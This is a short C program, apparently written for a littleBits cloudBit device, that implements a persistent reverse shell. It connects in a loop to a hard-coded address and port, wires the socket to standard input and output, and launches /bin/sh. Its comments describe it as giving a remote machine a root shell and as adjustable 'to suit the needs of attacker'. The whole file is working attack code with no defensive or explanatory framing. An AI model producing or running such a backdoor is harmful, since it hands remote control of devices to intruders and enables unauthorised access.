// Developed by Cervando Banuelos
// To test the network capabilities of the littleBits cloudBit
// This program can be used to give a shell to a remote machine
// and give the user root access.


#include <stdio.h> 
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/socket.h>

// arbitrary IP address and port number
// these were used during exploit development and can be changed
// to suit the needs of attacker
#define REMOTE_ADDR "10.0.0.104"
#define REMOTE_PORT 9001

int main(int argc, char *argv[])
{

	pid_t pid; //process ID


	while(true)
	{
		//create a new socket every time
		struct sockaddr_in sa;
		int s;

		sa.sin_family = AF_INET;
		sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
		sa.sin_port = htons(REMOTE_PORT);
		s = socket(AF_INET, SOCK_STREAM,0);
		
		//attempt to connect
		if ((connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0)) //connection fails
		{
			// if connection failed, close socket and try again with new socket
			close(s);
			continue;
		}




		else //connecitons succeeds
		{
			if ((pid = fork()) == 0) //Child Process
			{
				// dup2 and execve a shell over the port
				dup2(s,0);
				dup2(s,1);
				dup2(s,2);

				execve("/bin/sh", 0, 0);
				close(s);
				exit(0);
			}

			else //Parent Process
			{                               
			// parent process continues to try to connect even if child is closed.
			waitpid(-1, NULL, WNOHANG);
			close(s);
			continue;
	     	}
	}
}

return 0;
}
